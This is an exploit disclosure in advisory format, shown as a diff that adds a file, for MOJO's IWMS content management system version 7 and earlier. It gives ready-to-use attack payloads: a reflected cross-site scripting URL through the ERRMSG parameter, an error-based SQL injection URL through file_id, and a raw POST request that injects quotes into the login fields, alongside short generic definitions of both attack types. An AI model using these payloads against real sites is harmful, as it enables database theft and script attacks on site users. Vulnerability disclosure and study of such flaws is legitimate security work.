@@ -1,0 +1,29 @@
+# Exploit Title: MOJO's IWMS <= 7 SQL Injection & Cross Site Scripting.
+# Date: 2/02/10
+# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com<http://gmail.com> | www.DigitalWhisper.co.il<http://www.DigitalWhisper.co.il>
+# Software Link: http://www.mojo.co.il
+# Version: <= 7
+# Tested on: ASP
+#
+##[Cross Site Scripting]
+(Cross-Site Scripting attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. Cross-site scripting (XSS) attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user in the output it generates without validating or encoding it)
+#
+http://[HOST]/upload/default.asp?mode=wrong&ERRMSG=<h1>[Your_XSS_Here]<h1>
+#
+#
+##[SQL Injection]
+A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.
+#
+http://[HOST]/downloader.asp?file_id=1'+and+convert(int,@@version)='1
+#
+And:
+#
+HTTP POST REQUEST:
+POST /upload/default.asp?mode=nodatap HTTP/1.1
+Host: [HOST]
+Content-Length: 55
+#
+email=a%27&password=a%27&imageField.x=29&imageField.y=0
+#
+#
+[e0f]
